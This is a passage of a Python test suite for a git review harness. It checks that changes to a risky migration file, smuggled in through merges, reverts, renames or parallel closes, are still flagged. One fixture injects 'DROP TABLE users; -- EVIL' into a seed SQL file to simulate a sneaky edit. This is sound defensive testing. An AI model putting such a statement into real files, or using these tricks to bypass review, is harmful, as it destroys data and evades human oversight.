    def repo_with(self, *sids: str) -> GitRepo:
        self.repos = getattr(self, "repos", 0) + 1
        repo = GitRepo(self.tmp, name=f"m{self.repos}")
        self.stories = {s: story(s, touches=(MIG,)) for s in sids}
        repo.commit("docs: plan\n\nNo-story: docs", {**{path_of(s): x for s, x in self.stories.items()}, MIG: MIG_BASE})
        since = repo.commit("chore: adopt\n\nNo-story: harness")
        harness(repo, "chore: risky\n\nNo-story: harness", {RISKY: MIG_TOML})
        repo.publish()
        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
        return repo

    def codes(self, diffs: list[dict]) -> list[str]:
        return [d["code"] for d in diffs if d["level"] == "error"]

    def sync_merge_flow(self, trailer: str, number: int) -> tuple[list[str], list[str]]:
        repo = self.repo_with("AUTH-001", "AUTH-002")
        repo.git("checkout", "-q", "-b", "feature")
        h = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\ntwo\n")})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        h2 = repo.commit("feat: AUTH-002 work\n\nPart-of: AUTH-002", {MIG: MIG_BASE.replace("\n28\n", "\nx28\n")})
        repo.commit("feat: AUTH-002\n\nDecided: x.\n\nStory: AUTH-002",
                    {path_of("AUTH-002"): self.stories["AUTH-002"] + "\n## Breaker rounds\n" + round_line(1, h2)})
        repo.publish()
        repo.git("checkout", "-q", "feature")
        msg = "Merge origin/main into feature" + (f"\n\n{trailer}" if trailer else "")
        repo.git("merge", "-q", "--no-ff", "-m", msg, "origin/main", when=repo.next_date())
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, h)})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        pr = self.codes(self.check(BreakerPullRequestTest.pull_request(self, repo, "feature", number=number), "--ci",
                                   env=PR_ENV)[1])
        repo.git("merge", "-q", "--no-ff", "-m", f"Merge pull request #{number} from feature", "feature",
                 when=repo.next_date())
        repo.publish()
        return pr, self.codes(self.check(repo)[1])

    def test_HARN_022_S1_breaker7_build_storys_sync_merge_of_main_is_no_own_change_ESC_381(self):
        for trailer, number in (("Part-of: AUTH-001", 171), ("", 172)):
            with self.subTest(trailer=trailer or "none"):
                self.assertEqual(self.sync_merge_flow(trailer, number), ([], []))

    def test_HARN_022_S3_breaker7_a_merge_taking_the_other_sides_risky_file_is_its_own_change_ESC_381(self):
        for trailer, code in (("Part-of: AUTH-001", "RISKY_AFTER_CLOSE"), ("", "RISKY_NO_STORY")):
            with self.subTest(trailer=trailer or "none"):
                repo = self.repo_with("AUTH-001")
                fork = repo.sha()
                fix = repo.commit("feat: AUTH-001 fix\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\nFIXED\n")})
                repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                            {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, fix)})
                repo.publish()
                repo.git("checkout", "-q", "-b", "old", fork)
                repo.commit("docs: notes\n\nNo-story: docs", {"docs/n.md": "n\n"})
                repo.git("checkout", "-q", "main")
                repo.git("merge", "-q", "--no-ff", "--no-commit", "old", when=repo.next_date())
                repo.git("checkout", "old", "--", MIG)
                repo.git("commit", "-q", "-m", "Merge old" + (f"\n\n{trailer}" if trailer else ""), when=repo.next_date())
                repo.publish()
                self.assertIn(code, self.codes(self.check(repo)[1]))

    def landed_x(self) -> tuple[GitRepo, str, str]:
        repo = self.repo_with("AUTH-001")
        fix = repo.commit("feat: AUTH-001 fix\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\nFIXED\n")})
        c1 = repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                         {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, fix)})
        repo.git("checkout", "-q", "-b", "bx")
        x = repo.commit("feat: sneak\n\nPart-of: AUTH-001", {MIG: (repo.path / MIG).read_text().replace("\n5\n", "\nEVIL\n")})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "-m", "Merge bx\n\nNo-story: docs", "bx", when=repo.next_date())
        repo.publish()
        self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))
        return repo, c1, x

    def test_HARN_022_S3_breaker7_a_merge_revert_reverts_only_what_it_undoes_ESC_382(self):
        repo, c1, x = self.landed_x()
        repo.git("checkout", "-q", "-b", "bt", c1)
        repo.git("merge", "-q", "-s", "ours", "--no-commit", x, when=repo.next_date())
        repo.write("notes/z.txt", "z\n")
        repo.git("add", "notes/z.txt")
        repo.git("commit", "-q", "-m", "Merge x (ours)\n\nNo-story: docs", when=repo.next_date())
        t_ = repo.sha()
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "--no-commit", "bt", when=repo.next_date(), check=False)
        repo.git("checkout", "HEAD", "--", MIG)
        repo.git("commit", "-q", "-m", "Merge bt\n\nNo-story: docs", when=repo.next_date())
        repo.git("revert", "--no-edit", "-m", "1", t_, when=repo.next_date())
        msg = repo.git("log", "-1", "--format=%B").strip()
        repo.git("commit", "-q", "--amend", "-m", msg + "\n\nNo-story: docs", when=repo.next_date())
        repo.publish()
        self.assertIn("EVIL", (repo.path / MIG).read_text())
        self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker7_a_real_revert_of_the_merge_that_carried_x_reverts_x_ESC_382(self):
        repo, c1, x = self.landed_x()
        merge = repo.sha()
        repo.git("revert", "--no-edit", "-m", "1", merge, when=repo.next_date())
        msg = repo.git("log", "-1", "--format=%B").strip()
        repo.git("commit", "-q", "--amend", "-m", msg + "\n\nPart-of: AUTH-001", when=repo.next_date())
        revert = repo.sha()
        repo.publish()
        self.assertNotIn("EVIL", (repo.path / MIG).read_text())
        # X counts as reverted (not reported); the revert itself is a risky change after the close (ESC-383)
        found = [d for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"]
        self.assertEqual([revert[:12] in d["detail"] for d in found], [True])
        self.assertNotIn(x[:12], found[0]["detail"])


class HarnRound8Test(BreakerCase):
    """HARN-022 cold breaker, round 8 (ESC-383..385): each finding reproduced as a failing test first, from the round's
    probes; the decisions are the coordinator's (a revert gets no exemption; merge-tree allows unrelated histories and
    retries merge by merge; the pull request reads the trunk's own-change merges too)."""

    codes = HarnRound7Test.codes
    sync_merge_flow = HarnRound7Test.sync_merge_flow
    unrelated = False

    def repo_with(self, *sids: str) -> GitRepo:
        self.repos = getattr(self, "repos", 0) + 1
        repo = GitRepo(self.tmp, name=f"r{self.repos}")
        self.stories = {s: story(s, touches=(MIG,)) for s in sids}
        repo.commit("docs: plan\n\nNo-story: docs", {**{path_of(s): x for s, x in self.stories.items()}, MIG: MIG_BASE})
        if self.unrelated:  # years ago: a sub-project imported with its own history
            repo.git("checkout", "-q", "--orphan", "vendor")
            repo.git("rm", "-rqf", ".")
            repo.write("vendor/db/migrations/v1.sql", "create table v();\n")
            repo.git("add", "vendor")
            repo.git("commit", "-q", "-m", "vendor: initial", when=repo.next_date())
            repo.git("checkout", "-q", "main")
            repo.git("merge", "-q", "--allow-unrelated-histories", "--no-ff", "-m", "Import vendor\n\nNo-story: docs",
                     "vendor", when=repo.next_date())
            repo.git("branch", "-q", "-D", "vendor")
        since = repo.commit("chore: adopt\n\nNo-story: harness")
        harness(repo, "chore: risky\n\nNo-story: harness", {RISKY: MIG_TOML})
        repo.publish()
        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
        return repo

    def test_HARN_022_S1_breaker8_an_old_merge_of_unrelated_histories_breaks_no_landing_ESC_384(self):
        self.unrelated = True
        self.assertEqual(self.sync_merge_flow("Part-of: AUTH-001", 181), ([], []))

    def undo(self, repo: GitRepo, target: str, trailer: str, number: int) -> tuple[list[str], list[str]]:
        repo.git("checkout", "-q", "-b", "undo")
        repo.git("revert", "--no-edit", target, when=repo.next_date())
        msg = repo.git("log", "-1", "--format=%B").strip()
        repo.git("commit", "-q", "--amend", "-m", msg + f"\n\n{trailer}", when=repo.next_date())
        repo.git("push", "-q", "origin", "undo")
        repo.git("checkout", "-q", "main")
        pr = self.codes(self.check(BreakerPullRequestTest.pull_request(self, repo, "undo", number=number), "--ci",
                                   env=PR_ENV)[1])
        repo.git("merge", "-q", "--no-ff", "-m", f"Merge pull request #{number} from undo", "undo", when=repo.next_date())
        repo.publish()
        return pr, self.codes(self.check(repo)[1])

    def test_HARN_022_S3_breaker8_reverting_another_storys_reviewed_fix_is_a_risky_change_ESC_383(self):
        repo = self.repo_with("AUTH-001", "AUTH-002")
        f1 = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\ntwo\n")})
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, f1)})
        fix = repo.commit("fix: AUTH-002 security fix\n\nPart-of: AUTH-002",
                          {MIG: (repo.path / MIG).read_text().replace("\n20\n", "\n20 -- SECURITY FIX\n")})
        repo.commit("feat: AUTH-002\n\nDecided: x.\n\nStory: AUTH-002",
                    {path_of("AUTH-002"): self.stories["AUTH-002"] + "\n## Breaker rounds\n" + round_line(1, fix)})
        repo.publish()
        pr, trunk = self.undo(repo, fix, "Part-of: AUTH-001", 182)
        self.assertNotIn("SECURITY FIX", (repo.path / MIG).read_text())
        self.assertIn("RISKY_AFTER_CLOSE", pr)
        self.assertIn("RISKY_AFTER_CLOSE", trunk)

    def test_HARN_022_S3_breaker8_reverting_a_fix_a_re_close_reviewed_is_a_risky_change_ESC_383(self):
        repo = self.repo_with("AUTH-001")
        w = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\ntwo\n")})
        rec = self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, w)
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001", {path_of("AUTH-001"): rec})
        fix = repo.commit("fix: AUTH-001 security fix\n\nPart-of: AUTH-001",
                          {MIG: (repo.path / MIG).read_text().replace("\n20\n", "\n20 -- SECURITY FIX\n")})
        repo.commit("feat: AUTH-001 re-closed\n\nDecided: y.\n\nStory: AUTH-001", {path_of("AUTH-001"): rec + round_line(2, fix)})
        repo.publish()
        pr, trunk = self.undo(repo, fix, "Part-of: AUTH-001", 183)
        self.assertIn("RISKY_AFTER_CLOSE", pr)
        self.assertIn("RISKY_AFTER_CLOSE", trunk)

    def test_HARN_022_S1_breaker8_the_pull_request_reads_the_trunks_own_merges_too_ESC_385(self):
        repo = self.repo_with("AUTH-001")
        fork = repo.sha()
        repo.git("checkout", "-q", "-b", "side")
        repo.commit("docs: side\n\nNo-story: docs", {"docs/s.md": "s\n"})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "--no-commit", "side", when=repo.next_date())
        repo.write(MIG, MIG_BASE.replace("\n25\n", "\n25 -- by the merge\n"))
        repo.git("add", MIG)
        repo.git("commit", "-q", "-m", "Merge side\n\nPart-of: AUTH-001", when=repo.next_date())
        repo.publish()
        repo.git("checkout", "-q", "-b", "feature", fork)
        h = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\ntwo\n")})
        repo.git("merge", "-q", "--no-ff", "-m", "Merge origin/main into feature\n\nPart-of: AUTH-001", "origin/main",
                 when=repo.next_date())
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, h)})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        pr = self.codes(self.check(BreakerPullRequestTest.pull_request(self, repo, "feature", number=184), "--ci",
                                   env=PR_ENV)[1])
        repo.git("merge", "-q", "--no-ff", "-m", "Merge pull request #184 from feature", "feature", when=repo.next_date())
        repo.publish()
        trunk = self.codes(self.check(repo)[1])
        self.assertEqual(pr, trunk)
        self.assertIn("BREAKER_STALE", pr)


class HarnRound9Test(BreakerCase):
    """HARN-022 cold breaker, round 9 (ESC-386..388): each finding reproduced as a failing test first, from the round's
    probes; the decisions are the coordinator's."""

    codes = HarnRound7Test.codes
    sync_merge_flow = HarnRound7Test.sync_merge_flow
    repo_with = HarnRound8Test.repo_with
    unrelated = False

    OLD, NEW = "apps/api/notes/seed.sql", "apps/api/migrations/0002_seed.sql"
    SEED = "".join(f"insert into t values ({i});\n" for i in range(1, 21))

    def rename_carry(self) -> tuple[list[str], list[str]]:
        self.repos = getattr(self, "repos", 0) + 1
        repo = GitRepo(self.tmp, name=f"q{self.repos}")
        self.stories = {"AUTH-001": story("AUTH-001", touches=(MIG,))}
        repo.commit("docs: plan\n\nNo-story: docs", {path_of("AUTH-001"): self.stories["AUTH-001"], MIG: MIG_BASE})
        repo.commit("chore: seed notes\n\nNo-story: docs", {self.OLD: self.SEED})
        since = repo.commit("chore: adopt\n\nNo-story: harness")
        harness(repo, "chore: risky\n\nNo-story: harness", {RISKY: MIG_TOML})
        repo.publish()
        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
        fork = repo.sha()
        repo.git("checkout", "-q", "-b", "feature")
        repo.git("mv", self.OLD, self.NEW)
        repo.git("commit", "-q", "-m", "feat: AUTH-001 promote the seed\n\nPart-of: AUTH-001", when=repo.next_date())
        w = repo.sha()
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, w)})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "-m", "Merge pull request #1 from feature\n\nPart-of: AUTH-001", "feature",
                 when=repo.next_date())
        repo.publish()
        self.assertEqual(self.codes(self.check(repo)[1]), [])
        evil = self.SEED.replace("(20);", "(20);\nDROP TABLE users; -- EVIL")
        repo.git("checkout", "-q", "-b", "docs", fork)
        repo.commit("chore: tweak seed notes\n\nNo-story: docs", {self.OLD: evil})
        repo.git("push", "-q", "origin", "docs")
        repo.git("checkout", "-q", "main")
        pr = self.codes(self.check(BreakerPullRequestTest.pull_request(self, repo, "docs", number=190),
                                   "--ci", env=PR_ENV)[1])
        repo.git("merge", "-q", "--no-ff", "-m", "Merge pull request #2 from docs\n\nNo-story: docs", "docs",
                 when=repo.next_date())
        repo.publish()
        return pr, self.codes(self.check(repo)[1])

    def test_HARN_022_S3_breaker9_an_edit_carried_into_a_risky_file_by_a_rename_is_the_merges_own_ESC_386(self):
        pr, trunk = self.rename_carry()
        self.assertIn("RISKY_NO_STORY", pr)
        self.assertIn("RISKY_NO_STORY", trunk)
        self.assertTrue((self.tmp / f"q{self.repos}").exists())

    def test_HARN_022_S1_breaker9_build_storys_sync_merge_stays_clean_ESC_386(self):
        self.assertEqual(self.sync_merge_flow("Part-of: AUTH-001", 192), ([], []))

    def dup_pair(self, recreated_first: bool, number: int) -> tuple[list[str], list[str]]:
        repo = self.repo_with("AUTH-001", "AUTH-002", "AUTH-003")
        mig = lambda: (repo.path / MIG).read_text()  # noqa: E731
        w1 = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\ntwo\n")})
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n" + round_line(1, w1)})
        repo.publish()
        base = repo.sha()
        repo.git("checkout", "-q", "-b", "s1")
        repo.commit("docs: side\n\nNo-story: docs", {"docs/s.md": "s\n"})
        repo.git("checkout", "-q", "-b", "b2", base)
        repo.git("merge", "-q", "--no-ff", "--no-commit", "s1", when=repo.next_date())
        evil = mig().replace("\n25\n", "\n25 -- EVIL\n")
        repo.write(MIG, evil)
        repo.git("add", MIG)
        repo.git("commit", "-q", "-m", "Merge s1\n\nPart-of: AUTH-002", when=repo.next_date())
        other = repo.sha()
        repo.commit("feat: AUTH-002\n\nDecided: x.\n\nStory: AUTH-002",
                    {path_of("AUTH-002"): self.stories["AUTH-002"] + "\n## Breaker rounds\n" + round_line(1, other)})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "-m", "Merge b2\n\nPart-of: AUTH-002", "b2", when=repo.next_date())
        r = repo.commit("fix: remove the evil line\n\nPart-of: AUTH-003", {MIG: mig().replace("25 -- EVIL", "25")})
        repo.commit("feat: AUTH-003\n\nDecided: x.\n\nStory: AUTH-003",
                    {path_of("AUTH-003"): self.stories["AUTH-003"] + "\n## Breaker rounds\n" + round_line(1, r)})
        repo.publish()
        for n in range(400):
            repo.git("checkout", "-q", "-B", "bh", base)
            repo.git("merge", "-q", "--no-ff", "--no-commit", "s1", when=repo.next_date())
            repo.write(MIG, evil)
            repo.git("add", MIG)
            repo.git("commit", "-q", "-m", f"Merge s1 ({n})\n\nPart-of: AUTH-001", when=repo.next_date())
            if (repo.sha() < other) == recreated_first:
                break
        repo.git("push", "-q", "origin", "bh")
        repo.git("checkout", "-q", "main")
        pr = self.codes(self.check(BreakerPullRequestTest.pull_request(self, repo, "bh", number=number), "--ci",
                                   env=PR_ENV)[1])
        repo.git("merge", "-q", "--no-ff", "-m", "Merge bh\n\nPart-of: AUTH-001", "bh", when=repo.next_date())
        repo.publish()
        return pr, self.codes(self.check(repo)[1])

    def test_HARN_022_S3_breaker9_two_merges_with_one_tree_never_hide_each_other_ESC_387(self):
        for first, number in ((True, 193), (False, 194)):
            with self.subTest(recreated_first=first):
                pr, trunk = self.dup_pair(first, number)
                self.assertIn("RISKY_AFTER_CLOSE", pr)
                self.assertIn("RISKY_AFTER_CLOSE", trunk)

    def parallel_close(self, honest: bool) -> list[dict]:
        repo = self.repo_with("AUTH-001")
        base = repo.sha()
        repo.git("checkout", "-q", "-b", "y")
        repo.git("checkout", "-q", "main")
        repo.git("checkout", "-q", "-b", "x")
        w = repo.commit("feat: AUTH-001 work\n\nPart-of: AUTH-001", {MIG: MIG_BASE.replace("\n2\n", "\nEVIL\n")})
        repo.commit("feat: AUTH-001\n\nDecided: x.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): self.stories["AUTH-001"] + "\n## Breaker rounds\n"
                     + round_line(1, w if honest else base)})
        repo.git("checkout", "-q", "y")
        repo.commit("docs: AUTH-001 typo\n\nDecided: nothing.\n\nStory: AUTH-001", {"docs/typo.md": "t\n"})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "-m", "Merge x\n\nPart-of: AUTH-001", "x", when=repo.next_date())
        repo.git("merge", "-q", "--no-ff", "-m", "Merge y\n\nPart-of: AUTH-001", "y", when=repo.next_date())
        repo.publish()
        return self.check(repo)[1]

    def test_HARN_022_S1_breaker9_a_parallel_close_never_hides_what_the_first_close_reaches_ESC_388(self):
        self.assertIn("BREAKER_STALE", self.codes(self.parallel_close(honest=False)))
        found = [d["code"] for d in self.parallel_close(honest=True)]
        self.assertNotIn("BREAKER_STALE", found)
        self.assertNotIn("BREAKER_BAD_ENTRY", found)
        self.assertNotIn("BREAKER_UNRESOLVED", found)


if __name__ == "__main__":
    unittest.main()
